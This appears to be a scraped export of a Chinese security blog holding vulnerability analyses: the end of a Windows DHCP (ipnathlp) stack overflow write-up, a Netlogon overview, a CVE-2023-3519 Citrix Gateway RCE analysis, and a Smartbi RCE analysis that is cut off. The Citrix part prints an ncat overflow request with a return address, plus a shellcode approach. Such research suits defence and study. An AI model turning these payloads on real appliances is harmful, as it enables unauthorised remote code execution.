37 ....DESKTOP-T5P7 00000203`faa1fec4 34 45 53 51 12 00 00 00-44 45 53 4b 54 4f 50 2d 4ESQ....DESKTOP- 00000203`faa1fed4 54 35 50 37 34 45 53 3c-08 4d 53 46 54 20 35 2e T5P74ES\u0026lt;.MSFT 5. 00000203`faa1fee4 30 37 0e 01 03 06 0f 1f-21 2b 2c 2e 2f 77 79 f9 07......!+,./wy. 根据RFC rfc2132 option 53为传递DHCP消息类型，第一个字节是操作编号，第二个字节恒为1，第三个字节是消息类型，范围是1-9 根据代码，当DHCP中含有option 53一定会进入 DhcpExtractOptionsFromMessage的 if ( BYTE1(v9-\u0026gt;OptionID) )，把a3[1]赋值为不为零的值。 回到DhcpProcessMessage内，v13就不为0，不能进入触发漏洞的逻辑 重新构造DHCP数据包,，删除option53并将 Hardware address length改为100，单步调试，成功进入到 DhcpAddArpEntry函数内。\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f2a0 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x14a 0000000e`3487f380 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 在调试器中可以看到，执行memcpy时长度参数为0x64，继续运行则触发了栈溢出，进程异常退出。\n0:005\u0026gt; g Breakpoint 9 hit ipnathlp!DhcpAddArpEntry+0x184: 00007ff9`c0012570 e83db80600 call ipnathlp!memcpy (00007ff9`c007ddb2) 0:005\u0026gt; rr8 r8=0000000000000064 0:005\u0026gt; g STATUS_STACK_BUFFER_OVERRUN encountered (1858.3b4): Break instruction exception - code 80000003 (first chance) KERNELBASE!UnhandledExceptionFilter+0x7c: 00007ff9`ec55dd3c cc int 3 0:005\u0026gt; k Child-SP RetAddr Call Site 0000000e`34b7efa0 00007ff9`c007d096 KERNELBASE!UnhandledExceptionFilter+0x7c 0000000e`34b7f0c0 00007ff9`c007d229 ipnathlp!_raise_securityfailure+0x1a 0000000e`34b7f0f0 00007ff9`c0012600 ipnathlp!_report_gsfailure+0x169 0000000e`34b7f180 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x214 0000000e`34b7f260 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea 0000000e`34b7f360 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123 0000000e`34b7f420 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`34b7f480 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`34b7f4b0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`34b7f4f0 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`34b7f7f0 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`34b7f820 00000000`00000000 ntdll!RtlUserThreadStart+0x21 0:005\u0026gt; g ntdll!NtWaitForWorkViaWorkerFactory+0x14: 00007ff9`eeb70aa4 c3 ret wireshrk中可以看到数据包协议为Bootp。 PoC参考\r简单实现的DHCP Client并将option 53注释，将 Hardware address length改为0x100。 这个栈溢出长度和内容均为内容可控\n小结 这个漏洞起源于memcpy时src和len参数均来源于数据包内，为用户可控，导致攻击者可以通过设置过长长度触发memcpy越界写入，触发时的漏洞函数为处理BOOTP协议，这个协议是DHCP协议前身，DHCP兼容这个协议，在处理Bootp消息时，没有检查长度导致在复制mac时出错。\n参考链接\nhttps://bbs.kanxue.com/thread-278835.htm https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/preparing-to-debug-the-service-application#-enabling-the-debugging-of-the-initialization-code\nCreated at 2023-09-18T16:18:40+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/netlogon/","title":"Netlogon","tags":[],"description":"","content":"Overview Netlogon 远程协议客户端和服务器只能在加入域的系统上运行。\nnetlogon协议的交互过程可以详细解释如下:\n客户端发起连接,发送包含8字节的ClientChallenge的NetrServerReqChallenge RPC调用给服务器 服务器收到调用后,生成8字节的ServerChallenge发回客户端 客户端和服务端使用Key Derivation Function基于ClientChallenge、ServerChallenge和密码的hash生成会话密钥 客户端使用会话密钥加密ClientChallenge计算ClientCredential,发送给服务器 服务器端会话密钥和ClientChallenge计算ClientCredential，和客户端发送的ClientCredential比较是否相等 服务器端使用会话密钥和ServerCallenge计算ServerCredential，发给客户端 客户端使用会话密钥加密ServerCallenge计算ServerCredential并和服务端发送的ServerCredential作比较，相同则服务端和客户端都完成了身份校验 MS-NRPC\nCreated at 2023-08-10T03:30:09+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/","title":"CVE-2023-3519 Cirtix Gateway RCE分析","tags":["漏洞分析"],"description":"","content":"基本信息 Citrix ADC 及 Citrix Gateway 中存在缓冲区溢出漏洞，未授权的攻击者可以通过发送特殊请求触发漏洞，造成RCE。\n影响版本 NetScaler ADC 、NetScaler Gateway 13.1 \u0026lt; 13.1-49.13 NetScaler ADC 、NetScaler Gateway 13.0 \u0026lt; 13.0-91.13 NetScaler ADC 13.1-FIPS \u0026lt; 13.1-37.159 NetScaler ADC 12.1-FIPS \u0026lt; 12.1-55.297 NetScaler ADC 12.1-NDcPP \u0026lt; 12.1-55.297\n环境搭建 申请开发者试用，配置Citrix Gateway 技术分析\u0026amp;调试 根据国外安全研究员研究，该漏洞存在于/netscaler/nsppe文件内，diff修复前和修复后的nsppe，主要修改了ns_aaa_gwtest_get_event_and_target_names等几个函数 转到ns_aaa_gwtest_get_event_and_target_names函数，对比修复和未修复的代码，主要在调用ns_aaa_saml_url_decode函数时对v29添加了校验。 跟进ns_aaa_saml_url_decode函数，进入ns_aaa_saml_url_decode_inner\n__int64 __fastcall ns_aaa_saml_url_decode(__int64 a1, __int64 a2, __int64 a3) { return ns_aaa_saml_url_decode_inner(a1, a2, a3, 1LL); } 在ns_aaa_saml_url_decode_inner函数中a1是一个char指针，指向了http请求的url，在do while循环时遍历a1数组，当当前a1指向的字符是%，则获取到该字符后面两个字符通过datatable_ascii2bin得到对应的字符并写入到v4指向的数组内，实际上这里是url解码操作，解码后写入v4数组。 如果当前字符不是%则判断是不是+号，是+号则在v4数组内写入空格。两个都不是则直接写入到v4内，可以看出这块代码是在对传入的字符串判断是否为url编码如果是则进行url解码，如果不是则直接写入v4数组。\n__int64 __fastcall ns_aaa_saml_url_decode_inner(char *a1, _BYTE *a2, int a3, int a4) { _BYTE *v4; // rax unsigned __int64 v5; // r8 char v6; // bl char *v7; // r9 char v8; // r10 char v9; // r11 LODWORD(v4) = (_DWORD)a2; if ( a3 ) { v5 = (unsigned __int64)\u0026amp;a1[a3]; v4 = a2; do { v6 = *a1; if ( *a1 == \u0026#39;%\u0026#39; ) { v7 = a1 + 2; if ( (unsigned __int64)(a1 + 2) \u0026lt; v5 ) { v8 = a1[1]; if ( (unsigned __int8)(v8 - 48) \u0026lt;= 9u ) { v9 = *v7; if ( (unsigned __int8)(*v7 - 48) \u0026lt; 0xAu || (unsigned __int8)((v9 | 0x20) - 97) \u0026lt; 6u ) { if ( v9 != 53 ) v7 = a1; if ( (unsigned __int64)(a1 + 4) \u0026gt;= v5 ) v7 = a1; if ( v8 != 50 ) v7 = a1; if ( !a4 ) v7 = a1; *v4 = datatable_ascii2bin[(unsigned __int8)v7[2]] + 16 * datatable_ascii2bin[(unsigned __int8)v7[1]]; a1 = v7 + 3; goto LABEL_4; } } } } else if ( v6 == \u0026#39;+\u0026#39; ) { *v4 = 32; ++a1; goto LABEL_4; } ++a1; *v4 = v6; LABEL_4: ++v4; } while ( (unsigned __int64)a1 \u0026lt; v5 ); } return (unsigned int)((_DWORD)v4 - (_DWORD)a2); } 在循环中，写入的数组来源于传入的参数a2，并且do while循环结束是通过判断a1 \u0026lt; v5，v5 = \u0026amp;a1[a3];a1是传入的char数组，a3是传入的int。向上追溯调用参数来源。 ns_aaa_saml_url_decode函数的v5最终来源于传入的a1参数，a2为传入的参数，v25来源于*(a1+174)。不难猜测a1应为一个结构体指针，该指针指向的结构体中存储了指向存储请求url的char数组及该数组的长度，该段代码为解析url的各个参数，并根据参数不同进行的操作。\n__int64 __fastcall ns_aaa_gwtest_get_event_and_target_names(__int64 a1, __int64 a2, unsigned int *a3) { unsigned int v3; // r13d unsigned int *v4; // rbx __int64 v5; // r12 unsigned int v6; // r14d __int64 v7; // r13 __int64 v8; // r12 int v9; // r8d __int64 v10; // r10 unsigned __int16 v11; // ax __int64 v12; // rcx unsigned int v13; // eax int v14; // ecx bool v15; // cf int v16; // eax __int64 v17; // rcx int v19; // r14d __int64 v20; // rax int v21; // ecx unsigned int v22; // r13d __int64 v23; // rax unsigned int v24; // edx __int64 v25; // rdx int v26; // eax unsigned int v27; // [rsp+0h] [rbp-50h] __int64 v28; // [rsp+18h] [rbp-38h] BYREF __int64 v29; // [rsp+20h] [rbp-30h] v3 = *(unsigned __int16 *)(a1 + 174); v27 = v3 - 17; if ( v3 \u0026lt; 0x20 ) { v4 = a3; v5 = 0LL; v6 = 1441793; v7 = 0LL; goto LABEL_7; } v8 = *(_QWORD *)(a1 + 36); v29 = v8 + 17; v4 = a3; if ( (unsigned int)strncmp(\u0026#34;event=\u0026#34;, v8 + 17, 6LL) ) { v6 = 1441800; LABEL_5: v5 = 0LL; goto LABEL_6; } if ( !(unsigned int)strncmp(v8 + 23, \u0026#34;start\u0026amp;\u0026#34;, 6LL) ) { v19 = -29; v20 = 29LL; v21 = 1; } else { if ( (unsigned int)strncmp(v8 + 23, \u0026#34;done\u0026amp;\u0026#34;, 5LL) ) { v6 = 1441801; goto LABEL_5; } v19 = -28; v20 = 28LL; v21 = 2; } *v4 = v21; v5 = v20 + v8; v22 = v3 + v19; v6 = 1441802; v27 = v22; if ( (unsigned int)strncmp(\u0026#34;target=\u0026#34;, v5, 7LL) ) goto LABEL_6; v23 = _wrap_memchr(v5 + 7, 38LL, (int)(v22 - 7)); v24 = v22 - 7; v25 = v24 + 1; if ( (_DWORD)v25 != v22 - 6 ) { LABEL_6: v7 = v29; goto LABEL_7; } v26 = ns_aaa_saml_url_decode(v5 + 7, a2, v25); ns_aaa_gwtest_get_event_and_target_names由ns_aaa_gwtest_get_valid_fsso_server调用，其中v15为栈内char数组，大小为128字节。分析到这可以猜测，由于请求url的参数可控，自然请求url长度也可控，而v15这个数组为栈内数组，大小为128字节。ns_aaa_saml_url_decode_inner函数中循环次数由url长度决定，也就是可以控制写入v15数组的字节数，如果url过长则在循环时写入的字节数超过128字节，造成栈溢出。\n__int64 __fastcall ns_aaa_gwtest_get_valid_fsso_server(__int64 a1) { __int64 v1; // rbx unsigned int v2; // eax int v4; // r8d int v5; // r9d unsigned __int16 v6; // ax int v7; // r8d int v8; // r9d __int64 v9; // rcx unsigned int v10; // eax int v11; // ecx bool v12; // cf int v13; // eax __int64 v14; // rcx __int128 v15[8]; // [rsp+10h] [rbp-A0h] BYREF unsigned int v16; // [rsp+94h] [rbp-1Ch] BYREF __int64 v17; // [rsp+98h] [rbp-18h] BYREF int v18[3]; // [rsp+A4h] [rbp-Ch] BYREF memset(v15, 0, sizeof(v15)); v16 = 0; v18[0] = 0; if ( (unsigned int)ns_aaa_gwtest_get_event_and_target_names(a1, (__int64)v15, \u0026amp;v16) ) 向上追溯调用到该函数需要的路径，ns_aaa_gwtest_get_valid_fsso_server由ns_aaa_gwtest_handler调用，在代码中可以看到当请求url+8处为formssso时才会进入到调用ns_aaa_gwtest_get_valid_fsso_server函数的逻辑。\n__int64 __fastcall ns_aaa_gwtest_handler(__int64 a1, __int64 a2, __int64 a3, __int64 a4) { __int64 v5; // r15 __int64 v6; // rax __int64 v7; // rcx _QWORD *v8; // rax unsigned int v9; // r13d __int64 valid_fsso_server; // rax __int64 v11; // rbx unsigned int v12; // r14d __int64 v13; // rax __int64 is_valid_auth_action; // rax __int64 v15; // rax __int64 v16; // rcx unsigned int v17; // eax __int64 v18; // rcx __int64 v20; // rcx __int64 v21; // rdx __int64 v22; // [rsp+0h] [rbp-30h] v5 = a3; v6 = ns_async_ctx; if ( ns_async_ctx ) { v20 = (unsigned int)ns_async_callers_context_size; if ( *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 108) != 1486 ) panic_0(\u0026#34;Incorrect context id in ASYNC_SAVE_CTX\u0026#34;, a2, a3, (unsigned int)ns_async_callers_context_size, a4); v12 = *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 112); v11 = *(_QWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 116); *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 112) = 0; *(_QWORD *)(v6 + v20 + 116) = 0LL; goto LABEL_41; } v7 = *(_QWORD *)(a2 + 36); v8 = (_QWORD *)(v7 + 8); a3 = *(_DWORD *)(v7 + 8) | 0x20202020u; v9 = 32; if ( (int)a3 \u0026lt;= \u0026#39;lmar\u0026#39; ) { if ( (_DWORD)a3 == \u0026#39;?dck\u0026#39; ) { v12 = 7; v11 = 0LL; goto LABEL_41; } if ( (_DWORD)a3 == 1752462689 ) { if ( (*v8 | 0x2020202020202020LL) != \u0026#39;vreshtua\u0026#39; || (*(unsigned __int16 *)(v7 + 16) | 0x2020) != 29285 || (*(_BYTE *)(v7 + 18) | 0x20) != 63 ) { return v9; } v22 = a4; is_valid_auth_action = ns_aaa_gwtest_is_valid_auth_action(a2); if ( is_valid_auth_action ) { v11 = is_valid_auth_action; v12 = 1; goto LABEL_39; } return 3907; } if ( (_DWORD)a3 != \u0026#39;lluf\u0026#39; ) return v9; v12 = 9 * ((*(_BYTE *)(v7 + 12) | 0x20) == 63); LABEL_20: v11 = 0LL; if ( !v12 ) return v9; goto LABEL_41; } if ( (int)a3 \u0026lt;= \u0026#39;nahb\u0026#39; ) { if ( (_DWORD)a3 == \u0026#39;lmas\u0026#39; ) { if ( (*(_WORD *)(v7 + 12) | 0x2020) == (*(_WORD *)\u0026#34;SP?\u0026#34; | 0x2020) \u0026amp;\u0026amp; (*(_BYTE *)(v7 + 14) | 0x20) == (aSamlsp_0[6] | 0x20) ) { v22 = a4; v13 = ns_aaa_gwtest_is_valid_auth_action(a2); if ( v13 ) { v11 = v13; v12 = 3; goto LABEL_39; } } else { if ( (*(_WORD *)(v7 + 12) | 0x2020) != (*(_WORD *)\u0026#34;IdP?\u0026#34; | 0x2020) || (*(_BYTE *)(v7 + 14) | 0x20) != (aSamlidp_1[6] | 0x20) ) { return v9; } v22 = a4; v15 = ns_aaa_gwtest_is_valid_auth_action(a2); if ( v15 ) { v11 = v15; v12 = 4; goto LABEL_39; } } } else { if ( (_DWORD)a3 != \u0026#39;mrof\u0026#39; || (*v8 | 0x2020202020202020LL) != \u0026#39;osssmrof\u0026#39; || (*(_BYTE *)(v7 + 16) | 0x20) != 63 ) return v9; v22 = a4; valid_fsso_server = ns_aaa_gwtest_get_valid_fsso_server(a2); ns_aaa_gwtest_handler由ns_vpn_process_unauthenticated_request函数调用，在ns_vpn_process_unauthenticated_request函数中有如下逻辑，当请求路径为/gwtest/时进入调用到目标函数的逻辑。\nif ( v51 == 1702131559 ) { if ( (*(_QWORD *)v26 | \u0026#39; \u0026#39;) != \u0026#39;/tsetwg/\u0026#39; ) goto LABEL_2888; LABEL_437: if ( ns_async_ctx \u0026amp;\u0026amp; *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 108) != 652 ) panic_0( \u0026#34;Async context ID does not match expected context ID NS_ASYNC_CTX_AAA_UNAUTH_GWTEST\u0026#34;, a2, v25, (unsigned int)ns_async_callers_context_size, v26); v25 = (unsigned int)(ns_async_callers_context_size + 192); ns_async_callers_context_size += 192; v30 = v1891; if ( ns_async_ctx ) { if ( *(_DWORD *)(ns_async_ctx + 8) != -87101427 ) goto LABEL_4683; if ( (unsigned int)v25 \u0026lt; *(_DWORD *)(ns_async_ctx + 104) ) { a2 = (unsigned int)v25; v25 = (unsigned int)(*(_DWORD *)(ns_async_ctx + (unsigned int)v25 + 108) - 172); if ( (unsigned int)v25 \u0026gt;= 0x611 ) goto LABEL_759; } } v164 = ns_aaa_gwtest_handler((__int64)v1896, v1897, 0LL, v1891); 综上可以总结到调用到漏洞函数ns_aaa_saml_url_decode_inner所需要的url为：\nhttp://target/gwtest/formssso?event=start\u0026amp;target=[overflow char] 只需要让[overflow char]过长即可溢出在ns_aaa_gwtest_get_valid_fsso_server函数内的char数组，造成溢出。查看nsppe防护，可以发现PIE,CANARY都没开，只需要利用栈溢出写入shellcode然后jmp esp即可执行shellcode。\n# checksec --file=nsppe_unpatched RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO Canary found NX disabled No PIE No RPATH No RUNPATH 68527 Symbols No 0 0 nsppe_unpatched 动态调试 找到nsppe进程\nroot@citrix3# ps aux | grep nsppe root 457 100.0 43.2 693320 693560 - Rs 19:10 223:34.32 nsppe (NSPPE-00) 禁用看门狗，使用命令禁止发送该信号\nroot@citrix3# nspf help Usage: \u0026#39;/netscaler/nspf ((\u0026lt;process_name\u0026gt; | \u0026lt;pid\u0026gt;) \u0026lt;action\u0026gt; | query)\u0026#39; where \u0026lt;process_name\u0026gt; is one of: NSPPE-00 aslearn awsconfig bgpd de imi isisd metricscollectomonuploadd nsaaad nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd nscopo nsfsyncd nsgslbautosyncnslcd nslped nsm nsnetsvc nsrised nstraceaggregatnsumond ospf6d ospfd ptpd ripd ripngd snmpd syshealthd root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0 nspf NSPPE-00 pbmonitor 0 Removing pitboss monitor on process NSPPE-00 pid 37387 使用Citrix ADC自带的gdb附加调试nsppe\ngdb /netscaler/nsppe 461 使用pattern_creat.rb创建字符串\n┌──(root㉿kali)-[~] └─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag 发送payload，触发漏洞，此时rsp为6641376641366641，对应offset为168，也就是168开始覆盖rsp 发送payload，触发漏洞，此时rip指向0xcc指令地址，gdb断下\necho -ne \u0026#39;GET /gwtest/formssso?event=start\u0026amp;target=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x62\\x8c\\x6d\\x00\\x00\\x00\\x00\\x00\\xcc HTTP/1.1\\r\\nHost: 192.168.52.108\\r\\n\\r\\n\u0026#39; | ncat --ssl 192.168.52.108 443 在gdb中可以看到缓冲区位于rbp-0xa0处。 通过谷歌，知道在Citrix ADC中，nsppe是网络子系统，一当nsppe进程down了，会造成系统无法处理网络请求，最直观的表现就是当ssh连接目标系统并使用gdb调试nsppe进程的时候，ssh会卡死，而后退出，因为服务器的网络子系统处于调试状态，没办法处理网络请求。\n所以在整个利用过程中，为了保证能够获取到shell/保活系统，要保证nsppe进程不会挂掉。通过shellcode调用popen函数然后执行系统命令，并返回到上层调用栈（保证请求正常返回）。\n之后就是常规则shellcode编写了，直接使用二进制文件内硬编码的popen函数地址即可。需要注意的就是nsppe内实现的url解码逻辑有点不太一样， 具体参考参考链接，这里就不详细展开了。\n小结 整个漏洞产生和利用原理简单直接，因为nsppe没有开启任何溢出防护措施，直接使用jmp esp即可，让我想起了这个经典表情包 不知道是不是因为这个引擎起源比较久的原因，nsppe没有去除调试符号，对于理解原理和调试exp都有非常大的帮助。\n申请开发人员许可\nhttps://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/\nCreated at 2023-07-27T10:48:40+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/","title":"Smartbi Rce","tags":[],"description":"","content":"基本信息 Smartbi是广州思迈特软件有限公司旗下的商业智能BI和数据分析品牌，为企业客户提供一站式商业智能解决方案。Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。\nSmartbi大数据分析平台存在远程命令执行漏洞，未经身份认证的远程攻击者可利用stub接口构造请求绕过补丁限制，进而控制JDBC URL，最终可导致远程代码执行或信息泄露。\n引用自\r奇安信NOX\n影响版本 V7\u0026lt;= Smartbi \u0026lt;= V10.5.8\n环境搭建 官网下载Smartbi V10.5.8即可，直接安装。\n技术分析\u0026amp;调试 解包官网提供的补丁包，可以发现如下：\n{ \u0026#34;version\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;2023-02-28 15:00:00\u0026#34;, \u0026#34;patches\u0026#34;: { \u0026#34;PATCH_20230228\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;修复了利用stub接口对 ‘DB2 命令执行漏洞’ 补丁进行绕过的远程命令执行漏洞 (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;修復了利用stub接口對 ‘DB2 命令執行漏洞’ 補丁進行繞過的遠程命令執行漏洞 (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a remote command execution vulnerability in DB2 that used the stub interface (Patch.20230228 @2023-02-28)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;*.stub\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;RejectStubPostPatchRule\u0026#34; }] }] }, \u0026#34;PATCH_20221122\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;修复了 DB2 命令执行漏洞 (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;修復了 DB2 命令執行漏洞 (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;/vision/RMIServlet\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnectionList\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] },{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnection\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] }] }] }, 可以看出来，补丁包对符合正则表达式*.stub 的url进行了处理，再根据补丁描述不难发现前一个补丁补的漏洞：DB2 命令执行漏洞。此处的漏洞应该是对其进行了绕过。\n转到web.xml里面，*.stub是由RMIServlet进行处理的，且只有两个filter。\n\u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;RMIServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CacheFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;GZIPFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.stub\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 继续查看web.xml，不难发现一些敏感接口均要经过CheckIsLoggedFilter，结合反编译的源码，猜测此filter为鉴权filter\n\u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/ExportServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/ExportHttpServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/DownloadExcelServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CheckIsLoggedFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/vision/MigrateServlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; public class CheckIsLoggedFilter implements javax.servlet.Filter { private static IExtendCustomFilter customFilterChecker; private static final Logger LOG = Logger.getLogger(CheckIsLoggedFilter.class); private static final Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; AUTHORITYMAP = new HashMap(); /* loaded from: smartbi-FreeQuery.jar:smartbi/freequery/filter/CheckIsLoggedFilter$IExtendCustomFilter.class */ public interface IExtendCustomFilter { int authorityFiltering(String str, String str2, HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse); } public void destroy() { } /* JADX WARN: Removed duplicated region for block: B:137:0x060f A[RETURN] */ /* Code decompiled incorrectly, please refer to instructions dump. To view partially-correct code enable \u0026#39;Show inconsistent code\u0026#39; option in preferences */ public void doFilter(javax.servlet.ServletRequest r9, javax.servlet.ServletResponse r10, javax.servlet.FilterChain r11) throws java.io.IOException, javax.servlet.ServletException { /* Method dump skipped, instructions count: 1568 To view this dump change \u0026#39;Code comments level\u0026#39; option to \u0026#39;DEBUG\u0026#39; */ throw new UnsupportedOperationException(\u0026#34;Method not decompiled: smartbi.freequery.filter.CheckIsLoggedFilter.doFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse, javax.servlet.FilterChain):void\u0026#34;); } public static void handleAutoLogin(HttpServletRequest request) { if (FreeQueryModule.getInstance().getUserManagerModule().isLogged()) { return; } String headerUserName = Bootstrap.getHeaderUserName(request); if (StringUtil.isNullOrEmpty(headerUserName)) { return; } IState state = (IState) request.getSession().getAttribute(\u0026#34;state\u0026#34;); boolean isLogged = (state == null || state.getUser() == null) ? false : true; if (!isLogged) { String headerPassword = Bootstrap.getHeaderPassword(request); if (headerPassword == null) { headerPassword = SmartbiXDataSetUtil.OTHER; } FreeQueryModule.getInstance().getStateModule().doStartRequest(request); boolean isAutoLogin = FreeQueryModule.getInstance().getUserManagerModule().login(headerUserName, headerPassword); if (isAutoLogin) { request.setAttribute(\u0026#34;isNeedAutoLogout\u0026#34;, \u0026#34;true\u0026#34;); } } } 而*.stub并未经过这个filter的处理，也就是未授权即可访问。\n转到Smartbi的RMIServlet中有如下代码，进行GET请求时，携带jsonpCallback参数即可转到doPost方法，该方法通过RMIUtil.parseRMIInfo方法获取RMI信息，跟进。\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException { String uri = req.getRequestURI(); try { String jsonpCallback = req.getParameter(\u0026#34;jsonpCallback\u0026#34;); if (StringUtil.isNullOrEmpty(jsonpCallback)) { ... } else { doPost(req, resp); } } catch (IOException e) { LOG.error(uri + \u0026#34;\\n\u0026#34; + e.getMessage(), e); } } /* JADX WARN: Finally extract failed */ @Override // smartbi.framework.rmi.IRMIServlet public void doPost(HttpServletRequest request, HttpServletResponse resp) throws ServletException, IOException { RMIModule.getInstance().doStartRequest(request); TraceConfig traceConfig = (TraceConfig) request.getSession().getAttribute(\u0026#34;TraceConfig\u0026#34;); if (this.tracedetail \u0026amp;\u0026amp; traceConfig == null) { traceConfig = new TraceConfig(); request.getSession().setAttribute(\u0026#34;TraceConfig\u0026#34;, traceConfig); } RMIInfo rmiInfo = RMIUtil.parseRMIInfo(request, true); String className = rmiInfo == null ? null : rmiInfo.getClassName(); String methodName = rmiInfo == null ? null : rmiInfo.getMethodName(); String params = rmiInfo == null ? null : rmiInfo.getParams(); ... try { String resultStr = processExecute(request, className, methodName, 